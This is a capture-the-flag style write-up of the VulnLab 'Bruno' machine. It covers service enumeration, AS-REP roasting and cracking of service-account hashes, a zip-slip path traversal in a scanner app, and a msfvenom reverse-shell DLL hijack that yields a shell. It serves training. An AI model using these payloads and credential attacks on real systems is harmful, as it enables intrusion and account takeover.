---
title: Bruno
date: 2026-02-24 20:45:15
categories: ["VulnLab"]
tags: ["DLL Hijacking", "FTP Anonymous Login", "Kerberos Authentication Misconfiguration", "Zip Slip"]
cover: https://assets.vulnlab.com/bruno_slide.png
---
# TLDR


# Enumeration 
```bash
(kali@kali)-[~]$ sudo nmap -p- bruno.vl
Nmap scan report for bruno.vl (10.10.99.171)
Host is up (0.16s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldaps
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPSsl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49675/tcp open  unknown
49677/tcp open  unknown
54951/tcp open  unknown
```
```bash
(kali@kali)-[~]$ sudo nmap -p21,53,80,88 -sC -sV bruno.vl

Starting Nmap 7.92 ( https://nmap.org ) at 2026-02-14 04:27 UTC
Nmap scan report for bruno.vl (10.10.99.171)
Host is up (0.16s latency).

PORT   STATE SERVICE     VERSION
21/tcp open  ftp         Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp           0 Jun 29  2022 app
|_-rw-r--r--   1 ftp      ftp           0 Jun 29  2022 benign
|_-rw-r--r--   1 ftp      ftp           0 Jun 29  2022 malicious
|_-rw-r--r--   1 ftp      ftp           0 Jun 29  2022 queue
| ftp-syst: 
|   STAT: 
|     System: Windows_NT
53/tcp open  domain      Simple DNS Plus
80/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-14 04:27:24Z)

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds
```
Starting with ports 21, 53, 80 and 88, FTP anonymous login is allowed and we can see the folders on the FTP server. Kerberos is running on port 88.

```bash
(kali@kali)-[~]$ $ sudo nmap -p135,3389,5985 -sC -sV bruno.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 23:47 EST
Nmap scan report for bruno.vl (10.10.99.171)
Host is up (0.16s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BRUNO
|   NetBIOS_Domain_Name: BRUNO
|   NetBIOS_Computer_Name: BRUNODC
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   DNS_Tree_Name: bruno.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-14T04:48:00+00:00
| ssl-cert: Subject: commonName=bruno.vl
|   Not valid before: 2026-02-13T04:13:11
|   Not valid after:  2026-08-15T04:13:11
|_  ssl-date: 2026-02-14T04:48:04+00:00; 0s from scanner time.
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```
RPC is on port 135, RDP on 3389 and WinRM on 5985. There’s a CN called brunodc.bruno.vl. We’ll add this to /etc/hosts.

```bash
(kali@kali)-[~]$ sudo nmap -p389,636,3268,3269 -sC -sV bruno.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 00:51 EST
Nmap scan report for bruno.vl (10.10.99.171)
Host is up (0.16s latency).

PORT     STATE SERVICE  VERSION
389/tcp  open  ldap     Microsoft Windows Active Directory LDAP
636/tcp  open  ssl/ldap Microsoft Windows Active Directory LDAP
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: 
|   othername: 1.3.6.1.4.1.311.25.1:<unsupported>
|   DNS: brunodc.bruno.vl
| Not valid before: 2026-02-14T04:04:16
| Not valid after:  2027-02-14T04:04:16
|_ssl-date: 2026-02-14T05:46:16+00:00; +0s from scanner time.
3268/tcp open  ldap     Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: 
|   othername: 1.3.6.1.4.1.311.25.1:<unsupported>
|   DNS: brunodc.bruno.vl
| Not valid before: 2026-02-14T04:04:16
| Not valid after:  2027-02-14T04:04:16
|_ssl-date: 2026-02-14T05:46:16+00:00; +0s from scanner time.

Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 55.86 seconds
```
LDAP is running on port 389, 636,3268 and 3269. A Windows IIS server is running on port 443.

```bash
(kali@kali)-[~]$ sudo nmap -p443,445,464,9389 -sC -sV bruno.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 00:47 EST
Nmap scan report for bruno.vl (10.10.99.171)
Host is up (0.16s latency).

PORT     STATE SERVICE       VERSION
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
| Not valid after: 2121-06-29T13:33:00
| tls-alpn: 
|_  http/1.1
|_http-title: IIS Windows Server
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
9389/tcp open  mc-nmf         .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1:
|     Message signing enabled and required
| smb2-time: 
|   date: 2026-02-14T05:47:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.34 seconds
```
Here are the rest of the known service ports. There’s a Windows IIS server running on port 443 and SMB on 445.

## FTP (21)
```bash
(kali@kali)-[~]$ ftp bruno.vl
Connected to bruno.vl.
220 Microsoft FTP Service
Name (bruno.vl:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -a
229 Entering Extended Passive Mode (|||58625|)
150 Opening ASCII mode data connection.
06-29-22 04:55PM       <DIR>          app
06-29-22 04:33PM       <DIR>          benign
06-29-22 01:41PM       <DIR>          malicious
06-29-22 04:33PM       <DIR>          queue
226 Transfer complete.
ftp> cd app
250 CWD command successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||58626|)
150 Opening ASCII mode data connection.
06-29-22 05:42PM                  165 changelog
06-28-22 07:15PM                  431 SampleScanner.deps.json
06-29-22 03:58PM                 7168 SampleScanner.dll
06-29-22 03:58PM               174592 SampleScanner.exe
06-28-22 07:15PM                  170 SampleScanner.runtimeconfig.dev.json
06-28-22 07:15PM                  154 SampleScanner.runtimeconfig.json
226 Transfer complete.
ftp> get *.json
local: *.json remote: *.json
ftp: Can't access '*.json': Permission denied
ftp> mget *.json
mget SampleScanner.deps.json [anpqy?]? yes
ftp: Can't access 'SampleScanner.deps.json': Permission denied
mget SampleScanner.runtimeconfig.dev.json [anpqy?]? yes
ftp: Can't access 'SampleScanner.runtimeconfig.dev.json': Permission denied
mget SampleScanner.runtimeconfig.json [anpqy?]? yes
ftp: Can't access 'SampleScanner.runtimeconfig.json': Permission denied
```
Accessing the FTP server, I found 4 folders called app, benign, malicious and queue. We don't have download permissions on them.
```bash
ftp> cd app
ftp> cd app
250 CWD command successful.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||57717|)
550 Access is denied.
ftp> cd ../benign
250 CWD command successful.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||57738|)
550 Access is denied.
ftp> cd ../malicious
250 CWD command successful.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||57621|)
550 Access is denied.
ftp>
```
No write permissions either.

```bash
ftp> cd benign
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||58687|)
150 Opening ASCII mode data connection.
06-29-22  04:32PM                4 test.exe
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> cd malicious
250 CWD command successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||58688|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> cd queue
250 CWD command successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||58702|)
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp>
```
There's a `test.exe` binary in the benign foldfer. Nothing in the other folders.

```bash
(kali@kali)-[~]$ cat changelog
Version 0.3
- integrated with dev site
- automation using svc_scan

Version 0.2
- additional functionality

Version 0.1
- initial support for EICAR string
```
Downloading the app folder on Kali Linux for analysis, there’s something called `svc_scan` inside the changelog file. Can’t confirm the purpose of it yet. It could be a username. Remember to set the FTP session to binary mode first before downloading the app folder. 

## DNS (53)
```bash
(kali@kali)-[~]$ dig axfr @bruno.vl

; <<>> DiG 9.20.15-2-Debian <<>> axfr @bruno.vl
; (1 server found)
;; global options: +cmd
.			86399	IN	NS	a.root-servers.net.
.			86399	IN	NS	b.root-servers.net.
.			86399	IN	NS	c.root-servers.net.
.			86399	IN	NS	d.root-servers.net.
.			86399	IN	NS	e.root-servers.net.
.			86399	IN	NS	f.root-servers.net.
.			86399	IN	NS	g.root-servers.net.
.			86399	IN	NS	h.root-servers.net.
.			86399	IN	NS	i.root-servers.net.
.			86399	IN	NS	j.root-servers.net.
.			86399	IN	NS	k.root-servers.net.
.			86399	IN	NS	l.root-servers.net.
.			86399	IN	NS	m.root-servers.net.
a.root-servers.net.	300	IN	A	198.41.0.4
;; Query time: 160 msec
;; SERVER: 10.10.99.171#53(bruno.vl) (UDP)
;; WHEN: Sat Feb 14 00:31:48 EST 2026
;; MSG SIZE  rcvd: 268

(kali@kali)-[~]$ fierce --domain bruno.vl --dns-servers 10.10.99.171
NS: brunodc.bruno.vl.
SOA: brunodc.bruno.vl. (10.10.99.171)
Zone: failure
Wildcard: failure
```
DNS Zone Transfer is not possible and subdomain enumeration is insignificant.

## HTTP (80)
![Windows IIS server](\images\Bruno\IIS.png)
A Windows IIS server is running on port 80. Nothing interesting from web enumeration with gobuster and dirsearch.

## Kerberos (88)
```bash
(kali@kali)-[~]$ sudo ~/webserver/kerbrute userenum --dc brunodc.bruno.vl -d bruno.vl users.txt
kerbrute
Version: dev (n/a) - 02/24/26 - Ronnie Flathers @ropnop

2026/02/24 08:26:43 > Using KDC(s):
2026/02/24 08:26:43 > brunodc.bruno.vl:88

2026/02/24 08:26:43 > [+] VALID USERNAME: administrator@bruno.vl
2026/02/24 08:26:43 > svc_scan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc_scan@BRUNO.VL:491b1526900ed07bf...

2026/02/24 08:26:43 > [+] VALID USERNAME: svc_scan@bruno.vl
2026/02/24 08:26:43 > Done! Tested 2 usernames (2 valid) in 0.690 seconds
```
Creating a username wordlist with svc_scan and administrator, I discovered that svc_scan is a valid user and its hash is dumped. It has no Kerberos Pre-Authentication enabled. This means it is AS-REP-Roastable.

## MSRPC (135 & 593)
```bash
Protocol: [MS-SCMR]: Service Control Manager Remote Protocol
Provider: services.exe
UUID = 367ABB81-9844-35F1-AD32-98F038001003 v2.0
Bindings:
  ncacn_ip_tcp:10.10.99.171[54748]

Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID = 12345678-1234-ABCD-EF00-0123456789AB v1.0
Bindings:
  ncalrpc:[LRPC-41339dccbdfdf3da5c]
  ncacn_ip_tcp:10.10.99.171[49675]

Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol
Provider: spoolsv.exe
UUID = 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0
Bindings:
  ncalrpc:[LRPC-41339dccbdfdf3da5c]
  ncacn_ip_tcp:10.10.99.171[49675]

Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol
Provider: spoolsv.exe
UUID = AE33069B-A2A8-46EE-A235-DDFD339BE281 v1.0
Bindings:
  ncalrpc:[LRPC-41339dccbdfdf3da5c]
  ncacn_ip_tcp:10.10.99.171[49675]
```
Using Impacket’s `rpcdump.py`, I found some exposed RPC interfaces over HTTP. Nothing significant for the enumeration on port 135.

## SMB (139 & 445)
```bash
(kali@kali)-[~]$ smbclient --no-pass -L //10.10.69.155
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.69.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
SMB anonymous login is possible. No SMB shares were enuemrated.

## RDP (3389)
```bash
(kali@kali)-[~]$ sudo nmap -p3389 --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" bruno.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 00:27 EST
Nmap scan report for bruno.vl (10.10.99.171)
Host is up (0.16s latency).

PORT     STATE SERVICE      VERSION
3389/tcp open  ms-wbt-server
| rdp-ntlm-info:
|   Target_Name: BRUNO
|   NetBIOS_Domain_Name: BRUNO
|   NetBIOS_Computer_Name: BRUNODC
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   DNS_Tree_Name: bruno.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-14T05:27:18+00:00
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     RDSTLS: SUCCESS
|_  RDP Encryption level: High

Nmap done: 1 IP address (1 host up) scanned in 3.86 seconds
```
A password is needed for RDP authentication.

## LDAP (389, 636, 3268, 3269)
```bash
(kali@kali)-[~]$ ldapsearch -x -H ldap://bruno.vl:636/ -s base
ldap_result: Can't contact LDAP server (-1)
(kali@kali)-[~]$ ldapsearch -x -H ldap://bruno.vl -D '' -w 'b "DC=bruno,DC=vl"
# extended LDIF
# LDAPv3
# base <> (default) with scope subtree
# filter: DC=bruno,DC=vl
# requesting: ALL
#
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v47fc
# numResponses: 1
```
Credentials are needed to access LDAP.

# Gaining a Foothold
## Abusing FTP Anonymous Login
```bash
(kali@kali)-[~]$ john --format=krb5asrep asrep_tgt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [PBKDF2-SHA1 128/128 AVX 4x])
Will run 2 OpenMP threads
Note: Passwords longer than 55 characters will be truncated.
Proceeding with wordlist mode using /usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>      ($krb5asrep$23$svc_scan@BRUNO.VL)

1g 0:00:00:00 DONE 2/3 (2026-02-14 02:21) 5.555g/s 305066c/s 305066C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
With svc_scan's dumped hash, we can crack it with John and got its plaintext.

```bash
(kali@kali)-[~]$ cat SampleScanner.runtimeconfig.dev.json
{
  "runtimeOptions": {
    "additionalProbingPaths": [
      "C:\\Users\\xct\\.dotnet\\store\\arch\\tfm",
      "C:\\Users\\xct\\.nuget\\packages"
    ]
   }
}
```
There's also a user called xct from `SampleScanner.runtimeconfig.dev.json`.

## BloodHound
With a domain user’s password, we’ll attempt to dump domain information and analyze it with Bloodhound Community Edition (CE). You can refer to [this source](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) to setup Bloodhound CE.

```bash
(kali㉿kali)-[~/vulnLabs/medium/bruno/bloodhound]
$ sudo bloodhound-python -u bruno.vl -u svc_scan -p Sunshine1 -ns 10.10.99.171 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: bruno.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: brunodc.bruno.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: brunodc.bruno.vl
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: brunodc.bruno.vl
INFO: Done in 00M 33S

(kali㉿kali)-[~/vulnLabs/medium/bruno/bloodhound]
$ ls -la
total 172
drwxr-xr-x  2 root root  4096 Feb 14 02:32 .
drwxr-xr-x  4 root root  4096 Feb 14 02:28 ..
-rw-r--r--  1 root root  3714 Feb 14 02:32 20260214\03223_computers.json
-rw-r--r--  1 root root 24193 Feb 14 02:32 20260214\03223_containers.json
-rw-r--r--  1 root root  3343 Feb 14 02:32 20260214\03223_domains.json
-rw-r--r--  1 root root  3948 Feb 14 02:32 20260214\03223_gpos.json
-rw-r--r--  1 root root 80789 Feb 14 02:32 20260214\03223_groups.json
-rw-r--r--  1 root root  3230 Feb 14 02:32 20260214\03223_ous.json
-rw-r--r--  1 root root 38288 Feb 14 02:32 20260214\03223_users.json
```
Collect the domain data with `Bloodhound-python`. The data will be stored in respective `.json` files.

### svc_scan
![svc_scan group membership](\images\Bruno\bh1.png)
![svc_scan relation with other users](\images\Bruno\bh2.png)
Starting with svc_scan in BloodHound CE, I observed it’s only a low-privileged domain user. I also found other users called Jeremy Singh and Charles Young. Only Jeremy is in the Account Operators group.

### Kerberoastable Users
![Kerberoastable Users](\images\Bruno\bh3.png)
Our svc_scan, together with a svc_net and the krbtgt users are kerberoastable, meaning they have a SPN set.

```bash
(kali@kali)-[~/.../medium/windows/bruno/ftp]$ impacket-GetNPUsers -dc-ip 10.10.107.164 -dc-host bruno.vl -request bruno.vl/svc_net -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for svc_net
$krb5asrep$23$svc_net@BRUNO.VL:505bb7b6e93bac87d4019c...

(kali@kali)-[~/.../medium/windows/bruno/ftp]$ john --format=krb5asrep asrep_tgt_svc_net
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
<REDACTED>          ($krb5asrep$23$svc_net@BRUNO.VL)
1g 0:00:00:00 DONE 2/3 (2026-02-21 05:06) 5.555g/s 307188p/s 307188c/s 307188C/s Stephani..Jessica1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We can also do AS-REP Roasting on the svc_net user. It has the same password as svc_scan.

### Domain Admins
![DA Cipher Query](\images\Bruno\bh4.png)
![Charles Young](\images\Bruno\bh5.png)
Charles Young is in the Domain Admins and Employees groups. I also found more users here called Sam Owen, Hugh Young, Natalie Anderson, Kayleigh Patel, Chloe Ball, Graeme Grant and Donna Harrison. All these users are in the Employees group and don’t have passwords. I couldn’t find any paths that directly connects svc_scan to Charles Young.

## Enumerating SMB Shares
```bash
(kali@kali)-[~/.../medium/windows/bruno/ftp]$ smbclient -L //10.10.69.155 -U svc_scan
Password for [WORKGROUP\svc_scan]:
Sharename       Type     Comment
---------       ----     -------
ADMIN$          Disk     Remote Admin
C$              Disk     Default share
CertEnroll      Disk     Active Directory Certificate Services share
IPC$            IPC      Remote IPC
NETLOGON        Disk     Logon server share
queue           Disk
SYSVOL          Disk     Logon server share

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.69.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
With svc_scan’s password, we find a queue SMB share. It’s the same name as one of the folders enumerated in FTP earlier. Maybe they are related.

```bash
(kali@kali)-[~/.../medium/windows/bruno/ftp]$ smbclient //bruno.vl/queue -U svc_scan
Password for [WORKGROUP\svc_scan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun 29 16:32:00 2022
  ..                                  D        0  Wed Jun 29 16:32:00 2022

                7863807 blocks of size 4096. 3745032 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Wed Jun 29 16:32:00 2022
  ..                                  D        0  Wed Jun 29 16:32:00 2022
  test.txt                            A        0  Sun Feb 15 02:16:00 2026

                7863807 blocks of size 4096. 3744364 blocks available
smb: \>
```
It’s empty but we can write to this share. We don’t have write access to the other shares but we can list their contents.

```bash
(kali@kali)-[~/.../medium/windows/bruno/ftp]$ smbmap -u svc_net -p Sunshine1 -H 10.10.107.164

[+] Detected 1 hosts serving SMB
[+] Established 1 SMB connection(s) and 1 authenticated session(s)

Host: 10.10.107.164        (bruno.vl)        [445]
    Disk                                                    Permissions     Comment
    ----                                                    -----------     -------
    ADMIN$                                                  NO ACCESS       Remote Admin
    C$                                                      NO ACCESS       Default share
    CertEnroll                                              READ ONLY       Active Directory Certificate Services share
    IPC$                                                    READ ONLY       Remote IPC
    NETLOGON                                                READ ONLY       Logon server share
    queue                                                   READ, WRITE
    SYSVOL                                                  READ ONLY       Logon server share

[+] Closed 1 connection
```
The svc_net user also has the same permissions as svc_scan.

## SampleScanner App
### Reverse Engineering `SampleScanner.dll`
Dynamic Link Library (DLL) is a Windows format (.dll) that contains code, functions, and resources that multiple programs use at the same time. Think of DLLs as a shared function that different programs and applications will use on the server. Instead of each application building its own copy of functions, Windows loads them from shared DLLs, which is why DLL Hijacking is possible and dangerous. If an app looks for a DLL and its full path isn’t specified, Windows looks for it in a specific sequence; application directory, system directories, current working directory and lastly PATH directories. If an attacker can write to any directory before the legitimate DLL location, he can drop a malicious DLL there and the target app loads it before the real DLL file. It runs, the service restarts, and the attacker gets privileges of the user which the app runs with.

With not much foothold information from BloodHound, I looked into the DLL files in FTP.

```bash
// Token: 0x06000002 RID: 2 RVA: 0x00000260 File Offset: 0x00000260
private static void Main(string[] args)
{
    string text = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    text.Replace("EYCAR", "EICAR");
    byte[] bytes = Encoding.ASCII.GetBytes(text);
    string[] files = Directory.GetFiles("C:\\Samples\\queue\\", "*", 1);
    int i = 0;
    while (i < files.Length)
    {
        string text2 = files[i];
        if (text2.EndsWith(".zip"))
        {
            using (ZipArchive zipArchive = ZipFile.OpenRead(text2))
            {
                foreach (ZipArchiveEntry zipArchiveEntry in zipArchive.Entries)
                {
                    string text3 = Path.Combine("C:\\samples\\queue\\", zipArchiveEntry.FullName);
                    ZipFileExtensions.ExtractToFile(zipArchiveEntry, text3);
                }
                File.Delete(text2);
                goto IL_010E;
            }
        }
        goto IL_008B;
        IL_010E:
        i++;
        continue;
        IL_008B:
        if (Program.PatternAt(File.ReadAllBytes(text2), bytes).Any<int>())
        {
            File.Copy(text2, text2.Replace("queue", "malicious"), true);
            File.Delete(text2);
            goto IL_010E;
        }
        File.Copy(text2, text2.Replace("queue", "benign"), true);
        File.Delete(text2);
        goto IL_010E;
    }
}
```
Opening `SampleScanner.dll` with [dnSpy](https://github.com/dnSpyEx/dnSpy) on Windows, I found the source code for this application. It’s an antivirus tester application for files. It unzips files from the `C:\\sample\\queue` SMB share, extracts and reads the bytes of each file in the `queue` folder and deletes the original `.zip` files. If the EICAR signature is found in a file, it is moved into the `malicious` folder, otherwise into the `benign` folder. The files are then classified as such respectively, leaving nothing left in the `queue` folder.

Additionally, the code doesn’t validate the file paths inside the extracted zip archives. This means the application unzips all the archives’ contents without proper checks of the content. An attacker could potentially load a malicious archive in the `queue` folder, execute it, and overwrite important files in the target file system. There’s a common vulnerability in Zip files. Using 7zip, we can include some path traversals in the file name and write to whichever directory the user has permissions to.

### Investigating SampleScanner behavior
To test this, replicate the FTP server's file structure in Windows and create a `test.zip` storing a `test.txt` file.
![Analyzing DLL source code](\images\Bruno\dll_code.png)
This particular section of code determines the target directory where the contents of the zip folder are written to. The `zipArchiveEntry.FullName` code returns the relative path of each file in the zipped archive. The `ExtractToFile()` method writes the file to the path specified in the `text3` variable.

```powershell
C:\samples\app>.\SampleScanner.exe
Unhandled exception. System.IO.IOException: The process cannot access the file 'C:\samples\queue\test.zip' because it is being used by another process.
   at System.IO.FileSystem.DeleteFile(String fullPath)
   at System.IO.File.Delete(String path)
   at SampleScanner.Program.Main(String[] args)
```
Running `SampleScanner.exe` on the `test.zip` archive, I got an error message saying it is currently used by another process.

![ProcMon Settings](\images\Bruno\procMon1.png)
Using ProcMon, we can analyze the activity of the `SampleScanner.exe` binary and see what DLL files it calls. Based on how this vulnerability arises, I filtered processes specifying missing DLL files.

![Missing DLL file](\images\Bruno\procMon2.png)
Running `SampleScanner.exe` again and observing the logged events, I discovered a missing `hostfxr.dll` file. Now we know that the app is looking in the `/samples/app` directory for DLL files but are missing. We can drop a malicious `hostfxr.dll` file there so that upon execution of the binary, the DLL can be located and will execute our payload. However, we only have write access to the `/samples/queue` directory. We’ll upload a zip archive there and do path traversal to write our DLL payload to the `/samples/app` directory.

### DLL Hijacking via Path Traversal
```bash
(kali@kali)-[~/vulnLabs/medium/Windowws/bruno]$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.7.230 LPORT=1337 -f dll -o hostfxr.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: hostfxr.dll
```
Generate the malicious `hostfxr.dll` file.

![Modify file name in 7zip with path traversal](\images\Bruno\7zip.png)
![Updated hostfxr.dll directory](\images\Bruno\dll_path_traversal.png)
Transferring the payload to Windows, we can use 7zip rename it via path traversal to write to the `app` directory. This won’t work when renaming files in file explorer because it disallows special characters. The DLL file is now in the `app` directory.

```bash
(kali㉿kali)-[~/vulnLabs/medium/windows/bruno]$ sudo python3 evilarc/evilarc.py evil.zip \app\hostfxr.dll
Creating evil.zip containing ..\/app\hostfxr.dll

(kali㉿kali)-[~/vulnLabs/medium/windows/bruno]$ ls
bloodhound  evilarc  evil.zip  ftp  hostfxr.dll  myeasylog.log  smb  users.txt

(kali㉿kali)-[~/vulnLabs/medium/windows/bruno]$ smbclient //bruno.vl/queue -U svc_scan
Password for [WORKGROUP\svc_scan]:
Try "help" to get a list of possible commands.
smb: \> put evil.zip
putting file evil.zip as \evil.zip (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sun Feb 22 07:33:25 2026
  ..                                  D        0  Wed Jun 29 09:41:03 2022
  evil.zip                            A     9352  Sun Feb 22 07:33:25 2026

                7863807 blocks of size 4096. 3613679 blocks available
smb: \>
```
After setting up a netcat listener on the port specified in the msfvenom payload in Kali Linux, zip the payload with [evilarc](https://github.com/ptoomey3/evilarc) and upload it to the `queue` SMB share.

```bash
(kali㉿kali)-[~/vulnLabs/medium/windows/bruno]
$ sudo nc -lnvp 1337
[sudo] password for kali:
listening on [any] 1337 ...
connect to [10.8.7.230] from (UNKNOWN) [10.10.127.128] 55252
Microsoft Windows [Version 10.0.20348.768]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
bruno\svc_scan

C:\WIndows\system32>hostname
brunodc
```
After a few minutes, we get a RCE session on `brunodc` as **svc_scan**. This worked because the uploaded `evil.zip` payload was loaded in the `queue` directory, the underlying `..\app\hostfxr.dll` file wasn’t checked for path traversal and got uploaded to its required location when the SampleScanner app runs. Thus running our payload and establishing the remote session from `brunodc`.

# PrivEsc via KrbRelayUp
```bash
Checking KrbRelayUp
  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (BRUNO) so it could be vulnerable.
  You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges
...

(kali@kali)-[~]$ nxc ldap 10.10.90.28 -u svc_scan -p Sunshine1 -M maq
[*] Initializing protocol databases
[*] Creating new workspace: /home/kali/.nxc/workspaces/default
[*] Logging to: /home/kali/.nxc/logs/nxc.log

LDAP        10.10.90.28    389    BRUNODC     [*] Windows Server 2022 Build 20348 (name: BRUNODC) (domain:bruno.vl) (signing:None) (channel binding:Never)
LDAP        10.10.90.28    389    BRUNODC     [+] bruno.vl\svc_scan:<REDACTED>
MAQ         10.10.90.28    389    BRUNODC     [*] Getting the MachineAccountQuota
MAQ         10.10.90.28    389    BRUNODC     MachineAccountQuota: 10

```
Using [winPeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) for Windows Enumeration, it found the DC could be vulnerable to KrbRelayUp attacks. Running NetExec on the DC to query LDAP information shows that **LDAP signing is not enforced**. Thus confirming it is vulnerable to KrbRelay attacks.

